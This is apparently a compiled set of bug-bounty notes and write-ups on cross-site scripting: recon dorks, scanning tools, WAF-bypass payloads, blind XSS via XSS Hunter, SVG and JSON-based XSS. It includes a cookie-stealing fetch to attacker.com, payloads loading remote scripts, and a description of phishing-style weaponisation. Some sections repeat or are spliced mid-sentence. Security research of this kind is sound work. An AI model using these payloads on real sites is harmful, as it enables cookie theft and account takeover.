
## DOM-Based XSS

- Difference between DOM-Based and traditional XSS.
- Vulnerable JavaScript functions:
- `innerHTML`, `eval()`, `document.write()`, `location`, etc.
- Debugging tools (e.g., browser developer tools).

## Advanced XSS Concepts

- Exploiting CSP (Content Security Policy) misconfigurations.
- Bypassing filters and WAFs.
- Polyglot XSS payloads.
- Mutation-based XSS (e.g., using HTML5 and SVG).

## Automated Exploitation of XSS

- Tools:
- XSS Hunter
- DalFox
- XSStrike
- Automating DOM-Based XSS detection with Puppeteer.

You can use XSStrike for reflected and DOM XSS scanning. 

🔹 multi-threaded crawling
🔹 WAF detection & evasion
🔹 outdated JS lib scanning
🔹 blind XSS support
🔹 bruteforce payloads from a file

> https://github.com/s0md3v/XSStrike




most common working payloads:

![[Pasted image 20250202183546.png]]


Some example of **img/onerror payload:**

```bash
 '"><svg/onload=prompt(5);>{{7*7}}
```

![[Pasted image 20250323194001.png]]


![[Pasted image 20250202183745.png]]


---

I started by looking for subdomains for `*.target.com` using Google Dorking. My approach is a bit unique compared to what most people do. Typically, people might search like this: `site:*.target.com` or `site:*.*.*.target.com` (especially for larger scopes). These mathods are also good but I combine everything and try a different type of dorks:

> **_site:*<*.target.*_**
> 
> **_site:*<-*.target.*_**
> 
> **_site:*>*.target.*_**
> 
> **_site:*->*.target.*_**
> 
> **_site:*<->*.target.*_**

In Normal approach you can see that

![](https://miro.medium.com/v2/resize:fit:788/1*38GntkvE8ZlWxSxjOKVWgg.png)

And in my approach:

![](https://miro.medium.com/v2/resize:fit:788/1*EQpRFlJUbSlecJhiD8iyLQ.png)

You can clearly see some small differences in those dorks. To find juicy subdomains, I used a specific dorks on that target, which looked something like this:

```bash
site:*<*.target.com intext:"login" | intitle:"login" | inurl:"login" | intext:"username" | intitle:"username" | inurl:"username" | intext:"password" | intitle:"password" | inurl:"password"
```

You will able see the some different subdomains which has login panels. Now, In that target I found 2 juicy subdomains which has search bar on home page.

Now, everyone asks me where and how I start looking for XSS vulnerabilities, so here’s my process: I first combine various tags and special characters (`abc ' " } < > ; // # -`) into a single search to understand how the web application responds to each one. For example, I might input something like this:

> abc’ “ ><>#; — —

This is always my first step when testing for XSS. **The goal is to see how the website handles different characters and whether it uses any Web Application Firewall (WAF) or encoding that might interfere with the injection.** In this case, I put my payload in search bar on both subdomains and I found that there was nothing in place that could block my attempts. This is output I got In one subdomain:

  
![](https://miro.medium.com/v2/resize:fit:788/1*OKpYabYTXjh6RDjEL0Qpog.png)

							And in second subdomain:

![](https://miro.medium.com/v2/resize:fit:788/1*iH8x4w6r_dHDy2A6KAJ00A.png)

You can see that there **is not output encoding**. So I think I should spend some more time on this and I created custom payload

```html
 abc’”><><img src=1 onerror=alert(document.cookie)>
```

This is my all-time favorite payload for testing XSS. I’ve found numerous vulnerabilities using just this one line of code.

Here is a Pop Up I Got:

![](https://miro.medium.com/v2/resize:fit:788/1*xkkbkc9NQsTX7ox_e8cOUQ.jpeg)


	Then I reported to YesWeHack and It was Accepted as a medium.

Follow Creator On Linked in (Most Active):

[https://www.linkedin.com/in/manan-sanghvi-799863176/](https://www.linkedin.com/in/manan-sanghvi-799863176/)

Follow Creator On Twitter:

[https://twitter.com/An____Anonymous](https://twitter.com/An____Anonymous)


---

**knoxss community.**

![None](https://miro.medium.com/v2/resize:fit:700/1*Yigaui5D_8YzsSJT0MgfPw.png)

**This extension will helpful when your website is vulnerable to xss(cross site scripting).**


<iframe width="361" height="642" src="https://www.youtube.com/embed/jhjXDPHJhq8" title="Bug Bounty | Burpsuite Scan for User-Controlled Input -- DOM Injection #bugbounty #cybersecurity" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


```shell
<svg><script>fetch('http://attacker.com/?cookie=' + document.cookie)</script></svg>Recon

URL encoding:

%3Csvg%3E%3Cscript%3Efetch('http://attacker.com/?cookie=' + document.cookie)%3C/script%3E%3C/svg%3E
```

---

## Automated XSS finding:

git clone tool: https://github.com/sarperavci/MXS

payloads file: ![[xsswafbypss.txt]]
![[Pasted image 20250616193633.png]]


---

#### 1️⃣ Unique keywords in the URL Path

```bash
/siteminderagent/forms/smpwservices.fcc
```

#### 2️⃣ Unicode XSS payload (WAF bypass)

```scss
\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\ u003e.
```

Quickly I tried to find similar endpoints in my private targets by grepping the `waymore` archived URLs like below:

```bash
waymore -i domain.com -mode U -oU waymore_domain.txt
cat waymore_domain.txt | grep "/siteminderagent/forms/smpwservices.fcc"
```

				Guess what… I found none 🫠

**Next, I shifted to dorking**

```javascript
inurl:/siteminderagent/forms/smpwservices.fcc
```

After smpwservices.fcc I added the same params with that unicoded payload.

```javascript
?SMAUTHREASON=7&USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\ u003e. 
```

> **RXSS at Nokia**

![None](https://miro.medium.com/v2/resize:fit:700/1*I4Y3YeT98opDovQSgILvjw.png)


> **RXSS at chrysler.com**

![None](https://miro.medium.com/v2/resize:fit:700/1*eE1ctdhyVY2WhKG6lx2mUA.png)

> **RXSS at wm.com**

![None](https://miro.medium.com/v2/resize:fit:700/1*QBhPhsT9Y1N1pEfNTlOFIw.png)

> **RXSS at cardinalhealth.com**

![None](https://miro.medium.com/v2/resize:fit:700/1*WtoJQjL3mROyncgH8dtaUA.png)

> **RXSS at hud.gov**

![None](https://miro.medium.com/v2/resize:fit:700/1*66qufWdfJuRAIhgKSfI3_Q.png)

Sometimes, you may ask like "_**What's the use of disclosing the endpoint after the vulnerability is fixed?**_"

My short answer is "_**Try to find the same endpoint, path, or param names in other subdomains, and also other targets with BBP or VDP policy**_"

# Find RXSS using Nuclei (DAST)

There are many ways to find parameters where the user input is getting reflected, this is just one such example using Nuclei (DAST). **Other methods I discussed are included in the below collection of XSS writeups**

Beginners want the tools to do everything for them, but I use nuclei to find parameters **where the input is getting reflected without sanitization, and from there I try to proceed manually**


**📒Template Link location in Kali**

```shell
/home/kali/.local/nuclei-templates/dast/vulnerabilities/xss

/home/kali/.local/nuclei-templates/dast/vulnerabilities/xss/reflected-xss.yaml
/home/kali/.local/nuclei-templates/dast/vulnerabilities/xss/dom-xss.yaml
```

> https://github.com/projectdiscovery/nuclei-templates/blob/main/dast/vulnerabilities/xss/reflected-xss.yaml

#### 🔍Nuclei (DAST — XSS)

- Only 2 templates we are interested in here.

![None](https://miro.medium.com/v2/resize:fit:700/1*idBejLOijxMrHdcsH1u4Kg.png)

`Prompt: Explain the main logic of the below nuclei template`

![None](https://miro.medium.com/v2/resize:fit:700/1*C90InpujWhxvv35Dmf24lg.png)


- Save your URLs with parameters in any file urls.txt and run the below command, and the output **we will get are the parameters where the input is not sanitized and getting reflected.**

**⚓This is the command that I use for XSS (DAST)**

```bash
nuclei -l urls.txt -t /home/kali/.local/nuclei-templates/dast/vulnerabilities/xss/ -dast
```

![None](https://miro.medium.com/v2/resize:fit:700/1*uIFI_8jE0yb1ID5psAbjDw.png)


From above we can observe parameter `PostCode` is a potential area to test for XSS as the HTML tags and quotes are not getting sanitized and converted.

Now perform manual testing🙂

[manually test for RXSS](https://portswigger.net/support/using-burp-to-manually-test-for-reflected-xss)

⛏️Labs with solutions

https://portswigger.net/web-security/all-labs

> Hunter1: Blind automation without the core understanding.

> Hunter2: Automation with a basic fundamental understanding.

> **Elite Hunter: They develop the automation!**

----

## Google Cloud Shell for Bug Hunters

_Found RXSS using Google Cloud Shell and XssVibes_

#### Cross-Site Scripting Vulnerability

👉 **Google Cloud Shell**: [https://shell.cloud.google.com](https://shell.cloud.google.com/)

**✅Advantages**

1. Free to use with a Google account (5 GB persistent storage)
2. Accessible from any browser, no local setup needed
3. Great for temporary testing setups
4. Useful for stealth
5. Useful when you don't have time to setup WSL, no budget for Linux VPS, not enough host machine RAM for Linux VM, and need to run some scripts or tools.

**❌Limitations**


> https://cloud.google.com/shell/docs/quotas-limits


1. After a few 20–30 seconds of inactivity by the user, the connection will be lost automatically.

![None](https://miro.medium.com/v2/resize:fit:700/1*Fxjpw0Q8yuMAEvwtrVLJHw.png)

2. I did the entire setup of installation of tools and scripts, and when I checked the next day, all user downloaded binaries were no longer available, although it was running perfectly previously.

![None](https://miro.medium.com/v2/resize:fit:700/1*c01MmfyPSdr5MXHMjmzYYw.png)

However, files and directories downloaded under the home directory were stored persistently for next day as well. Hopefully , I was able to access the recon data that I collected previous day.

![None](https://miro.medium.com/v2/resize:fit:700/1*zE3_d7asLjd6d_VcJxmkjw.png)

3. Auto delete everything after 120 days of inactivity (number of days might change at the time you may be reading this article)

4. Cannot run scripts in the background 24×7

5. Not designed to be a full-time VPS.

6. Session Time Limit: Even with active use, each session has a 12-hour max runtime before it's reset.

Next, I followed all my techniques to find some unique programs. Preferably VDP for initial boost 🤡

For bounty targets, before it is made public it is already well tested by top hunters who were invited privately, hence the probability of finding well known bugs like RXSS decreases and space left for hardcore manual testing like business logic, privilege escalation, IDOR (not simply changing numeric IDs, more advanced ones) , BAC, HTTP Request Smuggling, Web Cache Posioning, chaining of multiple bugs and escalation of low vulnerabilities.

Identifying the NOs (restrictions) of the target and finding ways to convert it to a YES (bypass the restriction or prove that the restriction is wrongly implemented)👻

#### **⚙️ RXSS Workflow**

1️⃣ Running XSS VIBES Tool

> https://github.com/faiyazahmad07/xss_vibes

```bash
cd xss_vibes
python3 main.py -f urls_with_params.txt -t 10
```

![None](https://miro.medium.com/v2/resize:fit:700/1*gF0G23IiG9qusabJPXG7lA.png)

This is just one method, you can also follow finding [RXSS using Nuclei DAST methodology](https://medium.com/cybersecuritywriteups/find-rxss-using-nuclei-dast-87080542adde) as well.

2️⃣ Next, I need to verify whether it's working or not. In this case, got it easily without manual efforts, however don't stop if you don't get the results and instead test manually as well.

3️⃣ Find out what tags and keywords getting blocked or blacklisted by the web app. Go to the reflected area to check in what type of area it is getting inserted without sanitization (JSON area, Developer Comments, specific DOM elements). Then find alternatives, try multiple encoding techniques, and try [polyglot payloads](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot) as well.

I am not a dedicated manual tester, but manual is important because it may be possible that the parameter is vulnerable, but the tools are not able to craft the correct payload based on the reflected area dynamically.  

> Self Improvement Tip: Just open the source code of the tool if open-source and spend some time to understand how it is checking for xyz vulnerability and whether it can be improved and optimized anyway. Take the help of LLMs if you don't understand. But you need to have atleast basic idea of what is written with an overview and need to know the language of it.

First, I filter subdomains without WAF and then proceed. Recon commands step-by-step for beginners⬇️

> https://systemweakness.com/bug-hunting-recon-methodology-part1-legionhunter-975b7bbe3231

Payload: "onclick=prompt(/legionhunter/)><svg/onload=prompt(/legionhunter/)>" Parameter: lang WAF: None


I reported via an Embedded Form hosted on the company's security policy page.

![None](https://miro.medium.com/v2/resize:fit:700/1*HUgKHgRMIElHOSjCPymUOQ.png)

> Validated by Bugcrowd Triager

![None](https://miro.medium.com/v2/resize:fit:700/1*_2pozCIKVGBUA4KF8ld45A.png)

> RXSS Triaged (25 April 2025)

![None](https://miro.medium.com/v2/resize:fit:700/1*MJP3dD1K2TdhPxRGWSiQNA.png)

😈 Imagine an advanced intelligent tool that can identify and read the vulnerable reflected area and **dynamically generate context-aware payloads** instead of just fuzzing with a pre-defined payload list?

---

## Securing NASA For Certificate📜: P3 Vulnerability

This write-up is about how I discovered a **P3 vulnerability** in **NASA (National Aeronautics and Space Administration)**. The finding was simple and straightforward, without requiring advanced logical exploitation or abuse of access control mechanisms.

> Tool: https://github.com/hahwul/dalfox

If you see the scope of the NASA in Bugcrowd then, it is very huge, like thousands of subdomains are in scope for testing. So, I thought that finding those assets which is never tested by any hacker can be possible.

Instead of using popular tools like Subfinder or Amass, which almost everyone uses, I decided to focus on **search engine-based reconnaissance.** Because search engines and dorking can uncover hidden and sensitive IP addresses.

So, I started with different operators like

> **ssl:**
> 
> **hostname:**
> 
> **http.favicon.hash:**

etc… with this I’m able to find one subdomain which was very interesting because of its old UI. I started manually visiting each pages of a website.

Let Suppose the subdomain and the endpoint was: [https://xxx.nasa.gov/xxx_register/](https://xxx.nasa.gov/xxx_register/)

Which gave me one registration page in which many fields are available, first name, last name, email, username, email, password, etc..

![](https://miro.medium.com/v2/resize:fit:788/1*f5fJ003VoUSazDjx41rnxQ.png)

							Registration page

Whenever I find multiple parameters or any kind of submit/registration form I run **dalfox**, it will automatically find the parameters from the page and test them also it will do mining of the parameters.

So, I just run the command:

> dalfox url https://xxx.nasa.gov/xxx_register/

And boom! I found XSS on username parameter.

![](https://miro.medium.com/v2/resize:fit:788/1*sav6EVf40WJgImBWsBHDZQ.png)

							Cross Site Scripting

As I mentioned earlier, this was a straightforward finding once I got past the hardest part — **initial recon**. The key was to find those hidden domains that hadn’t been touched by any hacker yet.

Before Ending I want to give you 3 tips:

1. If you are hacking on NASA or thinking about that, then I suggest you to go for **deep recon** because there are lots of assets in NASA which is never touched by anyone.
2. If you find multiple parameters on the page, then never forgot to run **dalfox** on that page, it will extract all params and will test for XSS.
3. If you find **old UI** then spend time on it because these are often developer portals, where security and CSS are secondary priorities. This increases the likelihood of vulnerabilities.

And yes! Every hacker’s dream, got LOR ( Letter Of Recognition):

![](https://miro.medium.com/v2/resize:fit:788/1*6Idy-r4giPGqetSsjNZRRg.jpeg)

							Letter Of Recognition

> **Reported: 16 Nov 2024**
> 
> **Triaged: 18 Nov 2024**
> 
> **Accepted: 22 Nov 2024**
> 
> **Fixed: 30 Dec 2024**
> 
> **Got LOR ( Letter Of Recognition ): 02 Jan 2025**

**Connect with Creator**

> [https://www.linkedin.com/in/manan-sanghvi-799863176/](https://www.linkedin.com/in/manan-sanghvi-799863176/)
> 
> [https://www.instagram.com/_manan_sanghvi/](https://www.instagram.com/_manan_sanghvi/)
> 
> [https://twitter.com/_m](https://twitter.com/An____Anonymous)anan_sanghvi

---

## How to make sure blind xss payload is working or not💡

Make a html file with any of the default payload in your local system, double click and open the html file using browser and check if you are getting the email notification and also in the dashboard as well.

```js
<html>  
<script src="https://......."></script>  
</html>
```


**Try for HTMLi, RXSS, IFrame and ATO XSS payloads.**


Finding endpoints is part of the recon process, which I already covered in my previous articles. But what endpoints worth to look upon are:

- Input fields during signup / registration
- Login
- Contact form
- Feedback form
- “File a complaint” box form
- “Report xyz” form
- Password reset
- Profile update page
- Comment section
- Forums
- Chatbot section
- Support ticket
- “Ask for help” form
- Subscription , Newsletter, Survey form
- One to one chat messaging
- User-Agent header in request
- Referer header in request
- Origin header in request
- Upload HTML file with BXSS payload

The test case that is missed out by many hunters is injecting the payload in the requests headers like User-Agent, Referer, Origin, etc..


Modify, customize, innovate accordingly based on your requirements and your own ideas.


```bash
subfinder -d target.com | gau | bxss -payload '"><script src=https://.....></script>' -header "X-Forwarded-For"

```

```bash
cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotor HTTP/1.1 ""\n";done\
```


> site:hackerone.com inurl:reports "blind XSS"

![](https://miro.medium.com/v2/resize:fit:875/1*7JGzkBWtOf-DjAKlGTsUcw.png)

```html
try: ...endpoint/<img src="x" onerror="prompt(document.domain)">xssa
```

## Exploiting Blind XSS in a Signup Page: Admin Panel Takeover and Real-World Impact ($3000 P2 Private Program)

#blind_xss

This vulnerability resided in the **username field**, where I injected a **Blind XSS payload**. The next day, my **XSS Hunter** instance lit up, revealing an image of the **admin panel interface** along with sensitive details.

# Understanding Blind XSS

Unlike **Reflected or Stored XSS**, Blind XSS triggers in an environment where the attacker does not receive an immediate response. Instead, the injected payload executes when accessed by a **privileged user**, typically in **internal dashboards, admin panels, or support ticket systems**.

# Step-by-Step Exploitation

# 1. Identifying the Injection Point

- The **Signup Page** accepted a `username` parameter, which was stored and later processed by backend administrators.
- There was **no proper sanitization or output encoding** in place, making it a perfect candidate for **Blind XSS**.

## 2. Injecting the Payload

I crafted a **Blind XSS payload** using **XSS Hunter**:

```html
"><script src="https://mianhammad.xsshunter.com/xss.js"></script>
```

- The payload was injected into the **username field**.
- Upon registration, the application stored this value in its database.

# 3. Waiting for Execution

![](https://miro.medium.com/v2/resize:fit:788/1*icU2g8yTwcPyglxI2A7QEg.png)

- Since it was a **Blind XSS**, I had to wait until an admin accessed the compromised entry.
- The next day, **XSS Hunter** logged the execution, capturing **screenshots of the admin panel interface**.
- The payload exfiltrated **cookies, CSRF tokens, and other sensitive data**, leading to a **potential full admin takeover**.

# Impact of the Vulnerability

A **successful Blind XSS attack** can have **severe consequences**, including:

**Admin Panel Takeover** — If an administrator’s session is hijacked, an attacker gains full control over the platform.

**Data Exposure** — Accessing sensitive user records, payment details, and internal reports.

**Privilege Escalation** — Exploiting the admin session to perform malicious actions like modifying user accounts.

**Widespread Internal Compromise** — If the application is part of a larger enterprise system, attackers can pivot into other areas.

# Mitigation Strategies for Developers & Pentesters

# 1. Implement Output Encoding

- Encode user input before rendering it in HTML, JavaScript, or inside attributes.
- Use security libraries like `DOMPurify` to sanitize input effectively.

# 2. Apply Content Security Policy (CSP)

- Restrict script execution to trusted sources.
- Use the following CSP directive to prevent inline scripts:

```bash
Content-Security-Policy: default-src 'self'; script-src 'self';
```

---
## BurpSuite Match & Replace👽

This burpsuite feature is provided for free but adapted by few hunters. Details below:

https://github.com/emadshanab/Blind-XSS-burp-match-and-replace

Most often used encodings are: URL encoding & HTML encoding, but who knows what may work beforehand.

you can use cyberchef or this site too: [DenCode | Encoding & Decoding Online Tools](https://dencode.com/)


## **PRO TIPS🤑**

- Some endpoints gets unlocked only when you do registration, signup on everything that the website offers. Examples: You may get another feedback form when you signup for their newsletter, a form that collects review on upcoming products that is sent only to registered users. This is what I call it as part of the _“DEEP RECON” methodology_.
- If you find blind XSS, also try to escalate the severity of the bug by chaining it with other bugs.First you report the blind XSS and then work on chaining and increasing the severity, so that probability of getting duplicate decreases upto some extent where you might spend few days in chaining and escalation.
- Surface level testing is already done by hundreds of other hunters on public programs (BBP/VDP), finding the hidden endpoints, untouched request or places is where we need to dive deep into which mostly comes when you perform manual heavy testing which is time consuming and that’s why less chance of duplicates compared to publicy available scripts which the majority of the crowd keep running without the basic fundamentals of why it works , how it works!
- Use [Polyglot payloads](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot), available from 2018 but recently the majority of the hunters have been seen to be using it as well.
- Do not leave any input field untouched / untested.
- Everyone will test the generic case of all injection vulnerabilities, but only few will try the blind and OAST😎 case of it.
- Save your work using Notion, Obsidian , cherrytree, etc.. After 2–3 months, when you again come back , you can compare for changes in the request , meanwhile others will think the program is very old and finding bugs on it is impossible.

## How threat actors weaponize blind XSS☠️

- Attacker already did the recon on how a usual pop-up in the application looks like.
- Attacker enters malicious code (not the basic default template payload), the one that shows a real world pop-up which seems like it is part of the application, **admin or any privilege user logs into the application to check for any ticket, forms submitted for review, complaints entered.** ==As soon as it is opened by admin, customized and fully weaponized Blind XSS payload will trigger,== it says like “Session expired due to some reasons! Enter your credentials again please” 😁🤣. But now the attacker has the fake prompt input details which will be send to the attacker’s server , which is relayed through a bunch of zombies or bots, so that it becomes difficult to trace back to the attacker. (Difficult but not impossible)


- Javascript auto-download “dropper” component of the malware.
- Directly send emails to the support team with blind xss payload in the subject and body of the email. (Note: This will not be considered a vulnerability but a part of red-team engagement❓🤔) [Learn more](https://medium.com/@renwa/new-technique-to-find-blind-xss-c2efcd377cc2)

[XSS Filter Bypass - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass/#bypass-using-bom)

![[Pasted image 20241130183717.png]]

![[Pasted image 20241130193128.png]]

---


## RXSS on chatbot Pages:

![[Pasted image 20241209054216.png]]

![[Pasted image 20241209054800.png]]

![[Pasted image 20250418125623.png]]

![[Pasted image 20250418125653.png]]

![[Pasted image 20250418125702.png]]

> [!NOTE]
> but always remember to use `document.domain` to verify whether the payload is executing on your in-scope domain or inside an iframe from a different domain. This helps confirm if the XSS is actually exploitable or sandboxed.

## RXSS on 404 page :


try adding a script in between the url (if you notice that the url seems fetching the 404 page from an internal file on the server.)

![[Pasted image 20250212025820.png]]

							Normal URL



![[Pasted image 20250212025635.png]]

						XSS payload in url

Then verify by seeing the browser response. You can try HTML injection aswell.

---
##  From empty page to POST based JSON XSS

#Content-0 

write-up from:

> https://medium.com/@daoud_youssef/from-empty-page-to-post-based-json-xss-153a4d994f93

 Usually my methodology first to go after subdomains with 403 or 404 response code or subdomains with empty main page because these subdomains are always neglected by the other bug bounty hunters and finding a vulnerability on it is more easy and means more chance to not get a duplicated report .  


So after i have collected subdomains i pass them to aquatone tool and open the HTML generated file in the browser and i noticed a subdomain with interesting name which is *webhook.redacted.com* 

with only one number in the whole page which is 0 as shown below:

![](https://miro.medium.com/v2/resize:fit:630/1*r4xsK6tuUN5If8LuPAey8A.png)

_The ordinary response of the subdomain_

Sometimes when you find subdomains with specific names may you think directly of some type of vulnerability.

For example, if you find **grafana.redacted.com** you will directly know that you are dealing with grafana and go direct to test its version for known exploits and this (webhook) name may attract you to search for SSRF vulnerability

as the name suggest it deals with URLs also **as I said before i love hunting on subdomain with empty pages so I decided to go with it**

![](https://miro.medium.com/v2/resize:fit:788/1*CSIq0mPFcdpa3-qMMXr4hQ.png)

				The response of GET request

First I changed the request method to POST instead of GET and nothing changed in the response

![](https://miro.medium.com/v2/resize:fit:788/1*R-dcxCpUDIKy3F890AMI_w.png)

			The response of POST based empty data

Then I added dummy post data a=4 and also nothing changed

![](https://miro.medium.com/v2/resize:fit:788/1*8jiEttYeKW__1xOd4QIrlA.png)

					The response of POST based data

Then I thought to add the post data as json data and i suddenly found this error:

![](https://miro.medium.com/v2/resize:fit:788/1*Fq051TKNkLzwZKZFRpPkcg.png)

			Error message in response due to JSON data in request

My eyes sparkled with this error as I though that I am going to find a SQLi vulnerability so I tried hard with all payloads , cheat sheet , write-ups and also tools like ZAP ,burp pro, sqlmap , ghauri but no luck with exploiting it but during my test I noticed that any data I inject in the json data it reflect in the source code non-encoded so I think if I can’t get SQLi let’s test for POST based json XSS

So I tried this payload `<script>alert(1)</script>` but as shown in the below screenshot it escaped the slash on the closing tag so the payload didn’t work

![](https://miro.medium.com/v2/resize:fit:788/1*q01pj35czzeTD9Zje6nWOQ.png)

		The web application escaped the closing tag slash

So I thought  to use HTML **wchich  has only open tag without the  need of closing tags to avoid the escape of closing tags** so I used `<img src=x onerror=alert(1)>` and bingo the payload reflected non encoded and trigger the alert when I show response in the browser .

but here is a very important notice that this could not be happened unless the response <mark style="background: #FFB86CA6;">header content-type is set to text/html</mark>

  
![](https://miro.medium.com/v2/resize:fit:788/1*C1x7quB7iixr205mrzwv5g.png)

		The JSON payload reflected non-encoded and rendered as HTML

But as we all know **no bug bounty program** will accept showing this only on burp, so we need to made a HTML POC and exploit the vulnerability with it, so looking at the payload we used, we need to send JSON data within form, as you can see that the request sent with header

```json
content-type: Application/x-www-form-urlencoded
```


![](https://miro.medium.com/v2/resize:fit:788/1*uE4U94Q2ZrkJUqdmsVQfWw.png)

				 first try of the payload

In this POC you need to notice a couple of things:

1- We injected the whole payload in the name of the parameter with empty value  

2- We should use **enctype=text/plain so the browser doesn’t url-encode these special character**  

3- I have added an auto submit code `(document.TheForm.submit())` **so the form submitted automatically** after victim opens the html page to avoid that the victim needed to do two action (open the page and submit the form) **because the more action needed from the victim means the less severity of the report,** 

so in this case the victim only needs to visit the malicious website which  contains the invisible payload.

**But unfortunately the browser added an extra equal sign (=) to the end of the payload** 

because it should do this between the name of the parameter and the value of it 

and as the value is empty, the equal sign added in the end of the payload, which stops it from work as shown below **because it breaks the json payload and the payload is no more a valid json** 

so the response goed back to be like as if it is a regular post based:

![](https://miro.medium.com/v2/resize:fit:788/1*jZKy0H6VFWjyboPj3jLq5Q.png)

				The equal sign break the JSON payload

I tried also to make the whole payload in the value of the parameter and with empty name parameter 

**but the browser added an  equal sign in the beginning of the payload which also make the payload a non valid json**. 

here I was very disappointed because the whole vulnerability will fail for an equal sign (=) added by the browser **which invalidate the JSON syntax.**

But suddenly i had an idea . The payload already had an equal sign (=) in the middle of it (<*img src=x onerror=alert(document.domain*) )


Why we don’t omit the equal sign from the payload and divide it to two pieces, so

the first is the part before **the equal sign and put it in the parameter name** and the second part after the equal sign,

put it in the value of the parameter and let the browser put the equal sign so it would complete the payload for us as shown below:

![](https://miro.medium.com/v2/resize:fit:788/1*OOsRWpme4bWs_DjHGXGIVQ.png)

				 final payload


In simple terms, the browser will add the "=" in the second payload inside the `<script>` parameter, compromising it, so that payload won't work.

But the other one, which is inside the "name" parameter, **will be executed**

since is before the (=)  and the browser won't add one inside of it.


And bingooooo it worked like a charm

![](https://miro.medium.com/v2/resize:fit:788/1*20A9rSbaaxieplgNlDXhyw.png)

					The payload works

## Takeaways :-

1- Fuzz everything even it shows blank page .

2- Never give-up and try to be creative .

3- Always begin with empty main page subdomains

---

## XSS VIA File Upload

I observed a interesting request on /api/v1/me to which i intercepted the response. Here, I observed different interesting parameters, such as

```json
[{"admin":false,"role":"readonly"},{"dashboard settings":{"write":false,"delete":false}}
```

The above one is example, and actual response body had around 30 parameters, with values set to false for different dashboard and user settings. We can change each one to true one by one manually for response manipulation, or we could automate this with simple burp trick which many readers might know.

To simply explain this, there is a feature in burpsuite called match and replace which will replace any text in burpsuite with custom values you provide.

To do this Navigate to burpsuite Intercept Tab -> Proxy Options -> Match and Replace -> Add.

![None](https://miro.medium.com/v2/resize:fit:700/1*1V8ja1k_VOpjO_MuhPhW-w.png)

					Burp Match and Replace

From the dropdown you can select the value from request/response# Account Takeover via XSS in e-signature feature worth 2500$ you want to manipulate, in my case its the json body in the response, so I will select the response body -> add original json in the left and my modified json in the right and save the request.

![None](https://miro.medium.com/v2/resize:fit:700/1*SmLHRnV64wSNTXjQyucMXA.png)

						Modified response body

Once done, I turned off intercept, and reload the browser again. This time burp automatically modifies these values wherever it finds in the response in the background and sends it.

After doing this, I found a new tab in my read only user which was Admin.

Now this feature was limited to admin user, but now I have this feature for read only user. Now, I was unable to perform any actions on the site such as edit/delete but I was able to view the admin features.

However, there was one small issue I observed here, which was whenever I tried to upload a file, and save it, it showed a 403 forbidden error, since I am only a readonly user. Now, I tried different file upload testcases here.
# Account Takeover via XSS in e-signature feature worth 2500$
There was a small misconfiguration here, which was when I turn on the intercept, and capture the file upload request for valid file type which was png, and in the response, it ==initially uploads the file to the server, and shows the uploaded file path in the json response body.== Even though the file upload was not successful in editing the admin dashboard after saving, the file was getting stored somewhere else in the application.

Now, the application only accepts png, jpeg, gif and svg file types. I tried to bypass the file validation to upload any malicious files, but was getting blocked constantly by cloudflare. However, I tried the svg file with below contents, which somehow bypassed the cloudflare validation, and I was able to get the uploaded file path from the json body.

```html
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
    <script>//<![CDATA[
        alert(document.domain)
    //]]>
    </script>
</svg>
```

If I navigate to the path, or share this url to victim user, the javascript would execute in the users browser, allowing us to steal their cookies.

![None](https://miro.medium.com/v2/resize:fit:700/1*ZsOqRu_r3XiIoYsHnae1DQ.png)

						xss getting executed.

---

## XSS Via SVG File Upload

~={yellow}There was a registration functionality in the page, and after registration by default you will be an admin user for your dashboard.=~ You can add other users into your dashboard and assign them user roles **lets say read only user.**

After registration into the dashboard using my victim email id, I quickly observed the dashboard, **which had several tabs on the top including an admin tab, where I could perform all the admin level tasks, to make changes to the application, add/delete users etc.**

I invited my attacker email user into the application **with readonly user privileges, and activated his account.**

~={green}Now as an attacker user, I tried everything in the application. The application was using cloudflare, hence all my xss, sqli and lfi testcase attempts did not work as it was blocking me.=~ 

I looked up and tried different cloudflare bypass xss payloads, and nothing worked.

Finally, I turned on my burpsuite intercept, and refreshed by read only users browser page, and observed each request/response one by one.

I observed a interesting request on /api/v1/me to which i intercepted the response. Here, I observed different interesting parameters, such as

```json
[{"admin":false,"role":"readonly"},{"dashboard settings":{"write":false,"delete":false}}
```

The above one is example, and actual response body had around 30 parameters, with values ~={orange}set to false for different dashboard and user settings.=~ 

We can change each one to true one by one manually for response manipulation, **or we could automate this with simple burp trick which many readers might know.**

To simply explain this, there is a feature in burpsuite ~={blue}called match and replace=~ which will replace any text in burpsuite with custom values you provide.

```
To do this Navigate to burpsuite Intercept Tab -> Proxy Options -> Match and Replace -> Add.
```

![None](https://miro.medium.com/v2/resize:fit:700/1*1V8ja1k_VOpjO_MuhPhW-w.png)

							Burp Match and Replace

From the dropdown you can select the value from request/response you want to manipulate, in my case its the json body in the response, 

so I will select the response body -> add original json in the left **and my modified json in the right and save the request.**

![None](https://miro.medium.com/v2/resize:fit:700/1*SmLHRnV64wSNTXjQyucMXA.png)

								Modified response body

Once done, I turned off intercept, and reload the browser again. This time burp automatically modifies these values wherever it finds in the response in the background and sends it.

After doing this, I found a new tab in my read only user which was Admin.

Now this feature was limited to admin user, but now I have this feature for read only user. 

Now, I was unable to perform any actions on the site such as edit/delete but I was able to view the admin features.

